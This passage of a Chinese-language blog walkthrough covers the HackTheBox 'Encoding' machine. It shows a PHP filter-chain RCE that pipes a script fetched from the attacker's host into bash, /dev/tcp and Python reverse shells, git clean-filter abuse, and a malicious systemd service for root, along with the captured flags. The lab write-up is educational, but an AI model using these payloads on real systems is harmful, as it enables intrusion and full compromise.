class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:104::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:104:105:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:105:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:106:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:107:113::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:108:114::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:109:115::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:110:116:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:111:117::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:112:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">svc:x:1000:1000:svc:&#x2F;home&#x2F;svc:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:999:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">fwupd-refresh:x:113:120:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
+<p>使用<code>php_filter_chain_generator</code>生成PAYLOAD并进行RCE</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/synacktiv/php_filter_chain_generator</span><br><span class="line">python php_filter_chain_generator.py --chain <span class="string">&#x27;&lt;?php system(&quot;curl http://10.10.*.*/bfl.sh | bash&quot;);?&gt;     &#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.2/9998 0&gt;&amp;1&#x27;</span> &gt; /tmp/bfl.sh</span><br><span class="line"><span class="built_in">cd</span> /tmp/ &amp;&amp; python -m http.server 80 &amp;</span><br><span class="line">python exp.py PAYLOAD</span><br></pre></td></tr></table></figure>
+<p>获取反弹Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for www-data on encoding:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on encoding:</span><br><span class="line">    (svc) NOPASSWD: &#x2F;var&#x2F;www&#x2F;image&#x2F;scripts&#x2F;git-commit.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/image/scripts/git-commit.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$u</span> ]]; <span class="keyword">then</span></span><br><span class="line">        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m <span class="string">&quot;Commited from API!&quot;</span> --author=<span class="string">&quot;james &lt;james@haxtables.htb&gt;&quot;</span>  --no-verify</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;python3 -c \&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;0.0.0.0&#x27;,9995));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\&quot;&quot;</span> &gt; /tmp/BFL</span><br><span class="line">chmod +x /tmp/BFL</span><br><span class="line">git init</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*.php filter=indent&#x27;</span> &gt; /var/www/image/.git/info/attributes</span><br><span class="line">git config filter.indent.clean /tmp/BFL</span><br><span class="line">sudo -u svc /var/www/image/scripts/git-commit.sh</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Git提供了一种过滤机制，允许用户在文件检出或提交到Git存储库时将自定义脚本应用于文件。<br />
+过滤机制由两种类型的过滤器组成：clean过滤器和smudge过滤器。clean过滤器用于在将文件提交到Git存储库之前转换文件的内容。smudge过滤器用于在从Git存储库检出文件时转换文件的内容。<br />
+在这种情况下，攻击者创建了一个clean过滤器，该过滤器执行一个Python脚本，该脚本打开一个反向shell到指定的IP地址和端口。攻击者已将Git配置为对/var/www/image目录中的所有PHP文件使用此clean过滤器。这意味着每当该目录中的PHP文件提交到Git存储库时，将应用clean过滤器，并执行Python脚本。<br />
+Generated By ChatGPT</p>
+</blockquote>
+<p>这个地方反弹Shell不能弹到本机<br />
+疑似是网络问题，不能通过VPN的网络接口接收python reverse shell<br />
+只能在靶机上再开个shell然后nc监听</p>
+<p>查看<code>user.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/svc/user.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">46b119076b33b6baadfb2467e0128703</span><br></pre></td></tr></table></figure>
+<h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for svc on encoding:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on encoding:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;systemctl restart *</span><br></pre></td></tr></table></figure>
+<p>查看路径权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getfacl /etc/systemd/system</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># file: etc&#x2F;systemd&#x2F;system</span><br><span class="line"># owner: root</span><br><span class="line"># group: root</span><br><span class="line">user::rwx</span><br><span class="line">user:svc:-wx</span><br><span class="line">group::rwx</span><br><span class="line">mask::rwx</span><br><span class="line">other::r-x</span><br></pre></td></tr></table></figure>
+<p>编写service如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">ExecStart&#x3D;&#x2F;bin&#x2F;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.*.*&#x2F;9996 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure>
+<p>写入service</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n W1NlcnZpY2VdCkV4ZWNTdGFydD0vYmluL2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMi85OTk2IDA+JjEiCgpbSW5zdGFsbF0KV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQ= | base64 -d &gt; /etc/systemd/system/bufferfly.service</span><br></pre></td></tr></table></figure>
+<p>重启service</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/systemctl restart bufferfly</span><br></pre></td></tr></table></figure>
+<p>获取Shell，查看root.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffba7f2f7e12fd7fa94a522e00db275e</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>xXxYOLOxXx
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://yoloyolo.top/2023/03/21/HackTheBox-Encoding/" title="HackTheBox_Encoding">https://yoloyolo.top/2023/03/21/HackTheBox-Encoding/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/12/HackTheBox-Flight/" rel="prev" title="HackTheBox_Flight">
+      <i class="fa fa-chevron-left"></i> HackTheBox_Flight
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/21/HackTheBox-Inject/" rel="next" title="HackTheBox_Inject">
+      HackTheBox_Inject <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_encoding"><span class="nav-number">1.</span> <span class="nav-text"> HackTheBox_Encoding</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text"> 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.2.</span> <span class="nav-text"> 路径枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vhost"><span class="nav-number">1.1.3.</span> <span class="nav-text"> VHOST</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
+  <div class="site-description" itemprop="description">Explorer for unknown.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">51</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
